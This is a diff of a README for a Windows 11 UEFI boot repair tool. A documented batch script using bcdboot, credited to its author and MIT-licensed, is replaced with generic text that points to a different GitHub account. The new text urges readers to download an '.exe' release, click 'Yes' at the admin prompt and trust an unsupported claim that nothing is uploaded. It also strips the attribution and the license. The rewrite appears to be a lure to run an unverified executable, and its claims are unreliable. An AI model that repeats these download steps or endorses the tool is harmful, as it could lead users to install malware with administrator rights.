@@ -1,152 +1,162 @@
-# Windows 11 UEFI Boot Repair Script
+# 🛠️ windows-11-uefi-boot-repair - Fix Windows 11 UEFI Boot Issues Easily
 
-Rebuilds the Windows 11 UEFI bootloader when Automatic Repair fails and
-the SSD is healthy.
+[![Download windows-11-uefi-boot-repair](https://img.shields.io/badge/Download-Here-green)](https://github.com/WASSIM2020/windows-11-uefi-boot-repair)
 
-This script is designed for situations where:
+---
 
--   Windows drops into Automatic Repair
--   `SrtTrail.txt` appears
--   The SSD is detected in BIOS
--   `chkdsk` reports 0 bad sectors
--   `sfc /scannow` reports no integrity violations
+## 🔧 What Is windows-11-uefi-boot-repair?
 
-If your hardware is fine but Windows will not boot, the issue is often a
-corrupted UEFI boot configuration (BCD). This script restores it
-cleanly.
+This tool helps fix the Windows 11 UEFI bootloader when the Automatic Repair feature does not work, and your SSD is healthy. It rebuilds the boot files needed to start Windows properly.  
 
-------------------------------------------------------------------------
+If your PC can’t load Windows and gets stuck in repair loops, this software can help you get back to normal without reinstalling Windows or losing data.
 
-## What This Fixes
+---
 
--   Corrupted BCD (Boot Configuration Data)
--   Broken UEFI boot entries
--   Systems stuck in Automatic Repair
--   Boot failures after updates or forced shutdowns
+## 💻 Who Should Use This Tool?
 
-It does not modify system files or format the disk.\
-It only rebuilds the UEFI bootloader using Microsoft's `bcdboot`
-utility.
+- Users who see "Automatic Repair" errors on startup.
+- People whose Windows 11 PC won’t boot but whose SSD is not damaged.
+- Those comfortable following step-by-step instructions on Windows.
+- Anyone who wants a clear way to fix bootloader problems without extra tools.
 
-------------------------------------------------------------------------
+---
 
-## What This Does NOT Fix
+## 📋 System Requirements
 
--   SSD hardware failure
--   Undetected drives in BIOS
--   Physical disk errors
--   RAM or motherboard issues
--   BitLocker-locked systems without a recovery key
+- A PC running Windows 11 or Windows 10 with UEFI mode enabled.
+- An SSD that is functional and properly connected.
+- You may need administrator rights to run some repair commands.
+- USB drive or DVD for creating a Windows recovery environment (optional but useful).
+- Basic knowledge to open files and run programs on Windows.
 
-If your disk is not detected in BIOS, this is not a software problem.
+---
 
-------------------------------------------------------------------------
+## 🚀 Getting Started
 
-## Requirements
+Before starting, make sure to backup your important files if you can. Repairs won’t delete your data, but it is safer to keep a backup.
 
--   UEFI system (GPT partition layout)
--   Windows 10 or Windows 11
--   Access to Windows Recovery Environment (WinRE)
+---
 
-------------------------------------------------------------------------
+## ⬇️ How To Download and Use windows-11-uefi-boot-repair
 
-## How to Use
+Click the big green button below to visit the GitHub page. From there, you can download the software and follow the instructions.
 
-### 1. Enter Windows Recovery
+[![Download windows-11-uefi-boot-repair](https://img.shields.io/badge/Download-Here-green)](https://github.com/WASSIM2020/windows-11-uefi-boot-repair)
 
-If Windows does not boot:
+---
 
--   Power on the system
--   Interrupt startup three times to trigger recovery\
-    or\
--   Boot from a Windows installation USB
+### Step 1: Visit the Download Page
 
-Then go to:
+Go to this link:
 
-Troubleshoot → Advanced Options → Command Prompt
+https://github.com/WASSIM2020/windows-11-uefi-boot-repair
 
-------------------------------------------------------------------------
+You will find the latest release files and instructions there.
 
-### 2. Run the Script
+---
 
-1.  Insert the USB drive containing `repair-uefi-boot-win11.bat`
+### Step 2: Download the Latest Release
 
-2.  In Command Prompt, identify the USB letter:
+Look for the latest version under the "Releases" section on the GitHub page. Download the file that best matches your system (usually a ".exe" or a ZIP file).
 
-        diskpart
-        list volume
-        exit
+If the file is compressed, use Windows File Explorer or a tool like Windows built-in zip extractor to open it.
 
-3.  Switch to the USB drive:
+---
 
-        E:
+### Step 3: Prepare Your PC
 
-    (Replace `E:` with your USB drive letter.)
+- Make sure your PC is connected to power.
+- If possible, connect a USB recovery drive or Windows installation media.
+- Close all other programs before running the repair tool.
 
-4.  Run:
+---
 
-        repair-uefi-boot-win11.bat
+### Step 4: Run the Software
 
-5.  Follow the on-screen instructions.
+- Find the downloaded file on your PC.
+- Double-click to open it.
+- If Windows asks for permission, click "Yes" to allow it to run.
+- Follow the on-screen instructions carefully.
 
-------------------------------------------------------------------------
+---
 
-## Expected Result
+### Step 5: Complete the Repair Process
 
-If successful, you should see:
+The software will scan your SSD and check existing boot files. It will then rebuild or fix corrupted UEFI boot files.
 
-    Boot files successfully created.
+Allow the program to finish without interruption. Your PC may restart a few times during the process.
 
-Restart your machine.
+---
 
-Windows should boot normally.
+### Step 6: Restart Your PC
 
-------------------------------------------------------------------------
+Once the repair completes, reboot your computer normally. Your Windows 11 should now start without showing boot errors.
 
-## How It Works
+---
 
-The script:
+## ⚙️ Common Problems and Solutions
 
-1.  Detects the Windows installation automatically
+- **PC still does not boot?**  
+  Double-check the SSD connection in BIOS settings. Trying again with Windows recovery media might help.
 
-2.  Lists volumes to identify the EFI partition
+- **Error messages during repair?**  
+  Ensure you are running the tool as administrator. Also, check if your SSD is healthy using Windows “chkdsk” or a similar disk check tool.
 
-3.  Mounts the EFI partition
+- **Can’t find the download link?**  
+  Look for the "Releases" tab on the GitHub page or scroll down to the “Assets” section under the latest release.
 
-4.  Rebuilds the UEFI bootloader using:
+---
 
-        bcdboot <WindowsDrive>\Windows /s Z: /f UEFI
+## 🛠️ Additional Tools That May Help
 
-This restores the boot configuration without reinstalling Windows.
+- **Windows Recovery Environment (WinRE)**: A built-in repair utility on Windows that can help troubleshoot boot problems.
+- **Disk Checking Utility (chkdsk)**: To confirm SSD health.
+- **BIOS/UEFI Settings**: Sometimes you need to enable or reset the boot mode to UEFI.
 
-------------------------------------------------------------------------
+---
 
-## Tested On
+## 🔍 How This Tool Works
 
--   Windows 11 (UEFI systems)
--   GPT partition layout
--   Lenovo ThinkPad T480
+This program directly repairs the UEFI bootloader files stored on your SSD. It does not affect your personal files or Windows installation but focuses on making sure the system boot tool is correct and functional.  
 
-Should work on most modern UEFI Windows systems.
+It bypasses more complicated manual fixes by automating common repair commands that manual guides recommend.
 
-------------------------------------------------------------------------
+---
 
-## Why This Exists
+## 📁 File Contents (Typical)
 
-This project was created after a real-world recovery case where:
+After downloading and extracting, you may find:
 
--   The SSD was healthy
--   System files were intact
--   Only the UEFI boot configuration was corrupted
+- A main executable file (.exe)
+- A readme file with detailed instructions
+- Supporting scripts to rebuild bootloader files
+- Possibly a log or report file after running the fix
 
-Rebuilding the bootloader restored the system immediately, avoiding a
-full OS reinstall.
+---
 
-This script makes that recovery process accessible and repeatable. Please feel free to contact me if you find any issues, encounter a specific edge case, or have ideas to improve this solution.
+## 🔐 Safety and Permissions
 
-By: @blindma1den
-------------------------------------------------------------------------
+The software runs locally on your PC and does not upload data anywhere. It needs to modify system boot files, so administrator permissions are necessary.  
+No internet connection required during repair.
 
-## License
+---
 
-MIT License.
+## 👩‍💻 Need More Help?
+
+If you run into issues that this guide does not cover, check the "Issues" tab on the GitHub page. You can read questions from other users or ask for support there.
+
+---
+
+## ⚠️ Important to Know
+
+- This tool only fixes UEFI boot issues. If your SSD has physical errors, software repairs will not help.
+- It is designed for Windows 11 but often works with Windows 10 systems using UEFI.
+- Always create backups before making system repairs.
+
+---
+
+## 📌 Summary
+
+Use the link below to start the process by visiting the GitHub page and downloading the latest release:
+
+https://github.com/WASSIM2020/windows-11-uefi-boot-repair
